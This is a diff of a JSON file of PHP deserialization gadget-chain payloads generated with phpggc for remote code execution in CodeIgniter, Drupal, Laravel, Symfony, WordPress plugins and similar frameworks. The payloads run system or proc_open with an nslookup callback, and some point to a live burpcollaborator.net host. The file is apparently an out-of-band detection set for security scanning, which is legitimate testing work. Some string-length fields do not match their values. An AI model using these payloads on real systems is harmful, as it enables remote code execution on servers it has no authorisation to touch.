@@ -3,144 +3,144 @@
     "_needs_dynamic_payload_editing": false,
     "name": "CodeIgniter 4.0.0-beta.1 <= ?",
     "gen_with": "./phpggc CodeIgniter4/RCE1 <function> <parameter>",
-    "payload": "O:39:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{s:8:\"*redis\";O:45:\"CodeIgniter\\Session\\Handlers\\MemcachedHandler\":2:{s:12:\"*memcached\";O:17:\"CodeIgniter\\Model\":5:{s:10:\"*builder\";O:32:\"CodeIgniter\\Database\\BaseBuilder\":0:{}s:13:\"*primaryKey\";N;s:15:\"*beforeDelete\";a:1:{i:0;s:8:\"validate\";}s:18:\"*validationRules\";a:1:{s:2:\"id\";a:1:{s:5:\"rules\";a:1:{i:0;s:6:\"system\";}}}s:13:\"*validation\";O:33:\"CodeIgniter\\Validation\\Validation\":1:{s:15:\"*ruleSetFiles\";a:1:{i:0;s:5:\"finfo\";}}}s:10:\"*lockKey\";s:72:\"nslookup CHANGEME\";}}"
+    "payload": "O:39:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{s:8:\"%00*%00redis\"%3BO:45:\"CodeIgniter\\Session\\Handlers\\MemcachedHandler\":2:{s:12:\"%00*%00memcached\"%3BO:17:\"CodeIgniter\\Model\":5:{s:10:\"%00*%00builder\"%3BO:32:\"CodeIgniter\\Database\\BaseBuilder\":0:{}s:13:\"%00*%00primaryKey\"%3BN%3Bs:15:\"%00*%00beforeDelete\"%3Ba:1:{i:0%3Bs:8:\"validate\"%3B}s:18:\"%00*%00validationRules\"%3Ba:1:{s:2:\"id\"%3Ba:1:{s:5:\"rules\"%3Ba:1:{i:0%3Bs:6:\"system\"%3B}}}s:13:\"%00*%00validation\"%3BO:33:\"CodeIgniter\\Validation\\Validation\":1:{s:15:\"%00*%00ruleSetFiles\"%3Ba:1:{i:0%3Bs:5:\"finfo\"%3B}}}s:10:\"%00*%00lockKey\"%3Bs:72:\"nslookup CHANGEME\"%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Drupal 7.0.8 < ?",
     "gen_with": "./phpggc Drupal7/RCE1 <function> <parameter>",
-    "payload": "O:11:\"SchemaCache\":4:{s:6:\"*cid\";s:14:\"form_DrupalRCE\";s:6:\"*bin\";s:10:\"cache_form\";s:16:\"*keysToPersist\";a:3:{s:8:\"#form_id\";b:1;s:8:\"#process\";b:1;s:9:\"#attached\";b:1;}s:10:\"*storage\";a:3:{s:8:\"#form_id\";s:9:\"DrupalRCE\";s:8:\"#process\";a:1:{i:0;s:23:\"drupal_process_attached\";}s:9:\"#attached\";a:1:{s:6:\"system\";a:1:{i:0;a:1:{i:0;s:17:\"nslookup CHANGEME\";}}}}}"
+    "payload": "O:11:\"SchemaCache\":4:{s:6:\"%00*%00cid\"%3Bs:14:\"form_DrupalRCE\"%3Bs:6:\"%00*%00bin\"%3Bs:10:\"cache_form\"%3Bs:16:\"%00*%00keysToPersist\"%3Ba:3:{s:8:\"#form_id\"%3Bb:1%3Bs:8:\"#process\"%3Bb:1%3Bs:9:\"#attached\"%3Bb:1%3B}s:10:\"%00*%00storage\"%3Ba:3:{s:8:\"#form_id\"%3Bs:9:\"DrupalRCE\"%3Bs:8:\"#process\"%3Ba:1:{i:0%3Bs:23:\"drupal_process_attached\"%3B}s:9:\"#attached\"%3Ba:1:{s:6:\"system\"%3Ba:1:{i:0%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Guzzle 6.0.0 <= 6.3.2",
     "gen_with": "./phpggc Guzzle/RCE1 <function> <parameter>",
-    "payload": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"GuzzleHttp\\Psr7\\FnStreammethods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"GuzzleHttp\\HandlerStackhandler\";s:17:\"nslookup CHANGEME\";s:30:\"GuzzleHttp\\HandlerStackstack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"GuzzleHttp\\HandlerStackcached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
+    "payload": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"%00GuzzleHttp\\Psr7\\FnStream%00methods\"%3Ba:1:{s:5:\"close\"%3Ba:2:{i:0%3BO:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"%00GuzzleHttp\\HandlerStack%00handler\"%3Bs:72:\"nslookup CHANGEME\"%3Bs:30:\"%00GuzzleHttp\\HandlerStack%00stack\"%3Ba:1:{i:0%3Ba:1:{i:0%3Bs:6:\"system\"%3B}}s:31:\"%00GuzzleHttp\\HandlerStack%00cached\"%3Bb:0%3B}i:1%3Bs:7:\"resolve\"%3B}}s:9:\"_fn_close\"%3Ba:2:{i:0%3Br:4%3Bi:1%3Bs:7:\"resolve\"%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.4.27",
     "gen_with": "./phpggc Laravel/RCE1 <function> <parameter>",
-    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"*events\";O:15:\"Faker\\Generator\":1:{s:13:\"*formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"*event\";s:17:\"nslookup CHANGEME\";}"
+    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:15:\"Faker\\Generator\":1:{s:13:\"%00*%00formatters\"%3Ba:1:{s:8:\"dispatch\"%3Bs:6:\"system\"%3B}}s:8:\"%00*%00event\"%3Bs:72:\"nslookup CHANGEME\"%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.5.39 (1)",
     "gen_with": "./phpggc Laravel/RCE2 <function> <parameter>",
-    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"*events\";O:28:\"Illuminate\\Events\\Dispatcher\":1:{s:12:\"*listeners\";a:1:{s:17:\"nslookup CHANGEME\";a:1:{i:0;s:6:\"system\";}}}s:8:\"*event\";s:17:\"nslookup CHANGEME\";}"
+    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:28:\"Illuminate\\Events\\Dispatcher\":1:{s:12:\"%00*%00listeners\"%3Ba:1:{s:72:\"nslookup CHANGEME\"%3Ba:1:{i:0%3Bs:6:\"system\"%3B}}}s:8:\"%00*%00event\"%3Bs:72:\"nslookup CHANGEME\"%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.5.39 (2)",
     "gen_with": "./phpggc Laravel/RCE3 <function> <parameter>",
-    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"*events\";O:39:\"Illuminate\\Notifications\\ChannelManager\":3:{s:6:\"*app\";s:17:\"nslookup CHANGEME\";s:17:\"*defaultChannel\";s:1:\"x\";s:17:\"*customCreators\";a:1:{s:1:\"x\";s:6:\"system\";}}}"
+    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"%00*%00events\"%3BO:39:\"Illuminate\\Notifications\\ChannelManager\":3:{s:6:\"%00*%00app\"%3Bs:72:\"nslookup CHANGEME\"%3Bs:17:\"%00*%00defaultChannel\"%3Bs:1:\"x\"%3Bs:17:\"%00*%00customCreators\"%3Ba:1:{s:1:\"x\"%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.5.39 (3)",
     "gen_with": "./phpggc Laravel/RCE4 <function> <parameter>",
-    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"*events\";O:31:\"Illuminate\\Validation\\Validator\":1:{s:10:\"extensions\";a:1:{s:0:\"\";s:6:\"system\";}}s:8:\"*event\";s:17:\"nslookup CHANGEME\";}"
+    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:31:\"Illuminate\\Validation\\Validator\":1:{s:10:\"extensions\"%3Ba:1:{s:0:\"\"%3Bs:6:\"system\"%3B}}s:8:\"%00*%00event\"%3Bs:72:\"nslookup CHANGEME\"%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.8.30",
     "gen_with": "./phpggc Laravel/RCE5 \"system('nslookup CHANGEME');\"",
-    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"*events\";O:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"*queueResolver\";a:2:{i:0;O:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1;s:4:\"load\";}}s:8:\"*event\";O:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\";O:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"*config\";O:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"*name\";s:7:\"abcdefg\";}s:7:\"*code\";s:43:\"<?php system('nslookup CHANGEME'); exit; ?>\";}}}"
+    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Ba:2:{i:0%3BO:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1%3Bs:4:\"load\"%3B}}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3BO:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"%00*%00config\"%3BO:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"%00*%00name\"%3Bs:7:\"abcdefg\"%3B}s:7:\"%00*%00code\"%3Bs:98:\"<?php system('nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net')%3B exit%3B ?>\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Monolog 1.18 <= 1.23",
     "gen_with": "./phpggc Monolog/RCE1 <function> <parameter>",
-    "payload": "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"*socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"*handler\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"*handler\";N;s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:17:\"nslookup CHANGEME\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:17:\"nslookup CHANGEME\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}"
+    "payload": "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"%00*%00socket\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BN%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}s:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Monolog 1.5 <= 1.17",
     "gen_with": "./phpggc Monolog/RCE2 <function> <parameter>",
-    "payload": "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:6:\"socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"*handler\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"*handler\";N;s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:17:\"nslookup CHANGEME\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:17:\"nslookup CHANGEME\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}"
+    "payload": "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:6:\"socket\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BN%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}s:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Pydio/Guzzle < 8.2.2",
     "gen_with": "./phpggc Pydio/Guzzle/RCE1 <function> <parameter>",
-    "payload": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"GuzzleHttp\\Psr7\\FnStreammethods\";a:1:{s:10:\"__toString\";a:2:{i:0;O:39:\"Pydio\\Core\\Controller\\ShutdownScheduler\":1:{s:50:\"Pydio\\Core\\Controller\\ShutdownSchedulercallbacks\";a:1:{i:0;a:2:{i:0;s:6:\"system\";i:1;s:17:\"nslookup CHANGEME\";}}}i:1;s:22:\"callRegisteredShutdown\";}}s:14:\"_fn___toString\";a:2:{i:0;r:4;i:1;s:22:\"callRegisteredShutdown\";}}"
+    "payload": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"%00GuzzleHttp\\Psr7\\FnStream%00methods\"%3Ba:1:{s:10:\"__toString\"%3Ba:2:{i:0%3BO:39:\"Pydio\\Core\\Controller\\ShutdownScheduler\":1:{s:50:\"%00Pydio\\Core\\Controller\\ShutdownScheduler%00callbacks\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:6:\"system\"%3Bi:1%3Bs:72:\"nslookup CHANGEME\"%3B}}}i:1%3Bs:22:\"callRegisteredShutdown\"%3B}}s:14:\"_fn___toString\"%3Ba:2:{i:0%3Br:4%3Bi:1%3Bs:22:\"callRegisteredShutdown\"%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Slim 3.8.1",
     "gen_with": "./phpggc Slim/RCE1 <function> <parameter>",
-    "payload": "O:18:\"Slim\\Http\\Response\":2:{s:10:\"*headers\";O:8:\"Slim\\App\":1:{s:19:\"Slim\\Appcontainer\";O:14:\"Slim\\Container\":3:{s:21:\"Pimple\\Containerraw\";a:1:{s:3:\"all\";a:2:{i:0;O:8:\"Slim\\App\":1:{s:19:\"Slim\\Appcontainer\";O:8:\"Slim\\App\":1:{s:19:\"Slim\\Appcontainer\";O:14:\"Slim\\Container\":3:{s:21:\"Pimple\\Containerraw\";a:1:{s:3:\"has\";s:6:\"system\";}s:24:\"Pimple\\Containervalues\";a:1:{s:3:\"has\";s:6:\"system\";}s:22:\"Pimple\\Containerkeys\";a:1:{s:3:\"has\";s:6:\"system\";}}}}i:1;s:17:\"nslookup CHANGEME\";}}s:24:\"Pimple\\Containervalues\";a:1:{s:3:\"all\";a:2:{i:0;r:6;i:1;s:17:\"nslookup CHANGEME\";}}s:22:\"Pimple\\Containerkeys\";a:1:{s:3:\"all\";a:2:{i:0;r:6;i:1;s:17:\"nslookup CHANGEME\";}}}}s:7:\"*body\";s:0:\"\";}"
+    "payload": "O:18:\"Slim\\Http\\Response\":2:{s:10:\"%00*%00headers\"%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:14:\"Slim\\Container\":3:{s:21:\"%00Pimple\\Container%00raw\"%3Ba:1:{s:3:\"all\"%3Ba:2:{i:0%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:14:\"Slim\\Container\":3:{s:21:\"%00Pimple\\Container%00raw\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}s:24:\"%00Pimple\\Container%00values\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}s:22:\"%00Pimple\\Container%00keys\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}}}}i:1%3Bs:72:\"nslookup CHANGEME\"%3B}}s:24:\"%00Pimple\\Container%00values\"%3Ba:1:{s:3:\"all\"%3Ba:2:{i:0%3Br:6%3Bi:1%3Bs:72:\"nslookup CHANGEME\"%3B}}s:22:\"%00Pimple\\Container%00keys\"%3Ba:1:{s:3:\"all\"%3Ba:2:{i:0%3Br:6%3Bi:1%3Bs:72:\"nslookup CHANGEME\"%3B}}}}s:7:\"%00*%00body\"%3Bs:0:\"\"%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony 3.3",
     "gen_with": "./phpggc Symfony/RCE1 <command>",
-    "payload": "O:43:\"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter\":3:{s:64:\"Symfony\\Component\\Cache\\Adapter\\AbstractAdaptermergeByLifetime\";s:9:\"proc_open\";s:58:\"Symfony\\Component\\Cache\\Adapter\\AbstractAdapternamespace\";a:0:{}s:57:\"Symfony\\Component\\Cache\\Adapter\\AbstractAdapterdeferred\";s:17:\"nslookup CHANGEME\";}"
+    "payload": "O:43:\"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter\":3:{s:64:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00mergeByLifetime\"%3Bs:9:\"proc_open\"%3Bs:58:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00namespace\"%3Ba:0:{}s:57:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00deferred\"%3Bs:72:\"nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net\"%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony 2.3.42 < 2.6",
-    "gen_with": "./phpggc Symfony/RCE2 <command>",
-    "payload": "O:38:\"Symfony\\Component\\Process\\ProcessPipes\":1:{s:45:\"Symfony\\Component\\Process\\ProcessPipesfiles\";a:1:{i:0;O:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"Symfony\\Component\\Finder\\Expression\\Expressionvalue\";O:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"*parser\";O:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"*cache\";a:1:{s:0:\"\";O:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"*template\";s:33:\"<?php nslookup CHANGEME;die(); ?>\";}}s:10:\"*current\";O:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"*globals\";a:0:{}}}}}"
+    "gen_with": "./phpggc Symfony/RCE2 <code>",
+    "payload": "O:38:\"Symfony\\Component\\Process\\ProcessPipes\":1:{s:45:\"%00Symfony\\Component\\Process\\ProcessPipes%00files\"%3Ba:1:{i:0%3BO:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"%00Symfony\\Component\\Finder\\Expression\\Expression%00value\"%3BO:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"%00*%00parser\"%3BO:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"%00*%00cache\"%3Ba:1:{s:0:\"\"%3BO:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"%00*%00template\"%3Bs:99:\"<?php system('nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net')%3B%3Bdie()%3B ?>\"%3B}}s:10:\"%00*%00current\"%3BO:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"%00*%00globals\"%3Ba:0:{}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony 2.6 <= 2.8.32",
-    "gen_with": "./phpggc Symfony/RCE3 <command>",
-    "payload": "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:51:\"Symfony\\Component\\Process\\Pipes\\WindowsPipesfiles\";a:1:{i:0;O:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"Symfony\\Component\\Finder\\Expression\\Expressionvalue\";O:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"*parser\";O:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"*cache\";a:1:{s:0:\"\";O:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"*template\";s:33:\"<?php nslookup CHANGEME;die(); ?>\";}}s:10:\"*current\";O:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"*globals\";a:0:{}}}}}"
+    "gen_with": "./phpggc Symfony/RCE3 <code>",
+    "payload": "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:51:\"%00Symfony\\Component\\Process\\Pipes\\WindowsPipes%00files\"%3Ba:1:{i:0%3BO:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"%00Symfony\\Component\\Finder\\Expression\\Expression%00value\"%3BO:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"%00*%00parser\"%3BO:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"%00*%00cache\"%3Ba:1:{s:0:\"\"%3BO:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"%00*%00template\"%3Bs:99:\"<?php system('nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net')%3B%3Bdie()%3B ?>\"%3B}}s:10:\"%00*%00current\"%3BO:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"%00*%00globals\"%3Ba:0:{}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "ThinkPHP 5.1.x-5.2.x",
     "gen_with": "./phpggc ThinkPHP/RCE1 <function> <parameter>",
-    "payload": "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"think\\process\\pipes\\Windowsfiles\";a:1:{i:0;O:17:\"think\\model\\Pivot\":3:{s:17:\"think\\Modeldata\";a:1:{s:5:\"Smi1e\";s:17:\"nslookup CHANGEME\";}s:21:\"think\\ModelwithAttr\";a:1:{s:5:\"Smi1e\";s:6:\"system\";}s:9:\"*append\";a:1:{s:5:\"Smi1e\";s:1:\"1\";}}}}"
+    "payload": "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"%00think\\process\\pipes\\Windows%00files\"%3Ba:1:{i:0%3BO:17:\"think\\model\\Pivot\":3:{s:17:\"%00think\\Model%00data\"%3Ba:1:{s:5:\"Smi1e\"%3Bs:72:\"nslookup CHANGEME\"%3B}s:21:\"%00think\\Model%00withAttr\"%3Ba:1:{s:5:\"Smi1e\"%3Bs:6:\"system\"%3B}s:9:\"%00*%00append\"%3Ba:1:{s:5:\"Smi1e\"%3Bs:1:\"1\"%3B}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "WordPress/Guzzle 4.0.0 <= 6.3.3+ (1)",
     "gen_with": "./phpggc WordPress/Guzzle/RCE/RCE2 <function> <parameter>",
-    "payload": "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":1:{s:41:\"GuzzleHttp\\Cookie\\FileCookieJarfilename\";O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"GuzzleHttp\\Cookie\\SetCookiedata\";C:33:\"Requests_Utility_FilteredIterator\":108:{x:i:0;a:2:{s:4:\"Name\";s:17:\"nslookup CHANGEME\";s:5:\"Value\";s:0:\"\";};m:a:1:{s:11:\"*callback\";s:6:\"system\";}}}}"
+    "payload": "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":1:{s:41:\"%00GuzzleHttp\\Cookie\\FileCookieJar%00filename\"%3BO:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"%00GuzzleHttp\\Cookie\\SetCookie%00data\"%3BC:33:\"Requests_Utility_FilteredIterator\":163:{x:i:0%3Ba:2:{s:4:\"Name\"%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"Value\"%3Bs:0:\"\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "WordPress/Guzzle 4.0.0 <= 6.3.3+ (2)",
     "gen_with": "./phpggc WordPress/Guzzle/RCE1 <function> <parameter>",
-    "payload": "O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"GuzzleHttp\\Cookie\\SetCookiedata\";C:33:\"Requests_Utility_FilteredIterator\":108:{x:i:0;a:2:{s:4:\"Name\";s:17:\"nslookup CHANGEME\";s:5:\"Value\";s:0:\"\";};m:a:1:{s:11:\"*callback\";s:6:\"system\";}}}"
+    "payload": "O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"%00GuzzleHttp\\Cookie\\SetCookie%00data\"%3BC:33:\"Requests_Utility_FilteredIterator\":163:{x:i:0%3Ba:2:{s:4:\"Name\"%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"Value\"%3Bs:0:\"\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "WordPress/P/WooCommerce 3.4.0 <= 3.6.2+",
     "gen_with": "./phpggc WordPress/P/WooCommerce/RCE1 <function> <parameter>",
-    "payload": "O:19:\"WC_Log_Handler_File\":1:{s:10:\"*handles\";C:33:\"Requests_Utility_FilteredIterator\":82:{x:i:0;a:1:{i:0;s:17:\"nslookup CHANGEME\";};m:a:1:{s:11:\"*callback\";s:6:\"system\";}}}"
+    "payload": "O:19:\"WC_Log_Handler_File\":1:{s:10:\"%00*%00handles\"%3BC:33:\"Requests_Utility_FilteredIterator\":137:{x:i:0%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "WordPress/P/YetAnotherStarsRating ? <= 1.8.6",
     "gen_with": "./phpggc WordPress/P/YetAnotherStarsRating/RCE1 <function> <parameter>",
-    "payload": "C:33:\"Requests_Utility_FilteredIterator\":82:{x:i:0;a:1:{i:0;s:17:\"nslookup CHANGEME\";};m:a:1:{s:11:\"*callback\";s:6:\"system\";}}"
+    "payload": "C:33:\"Requests_Utility_FilteredIterator\":137:{x:i:0%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": true,
     "name": "Yii 1.1.20",
     "gen_with": "./phpggc Yii/RCE1 <function> <parameter>",
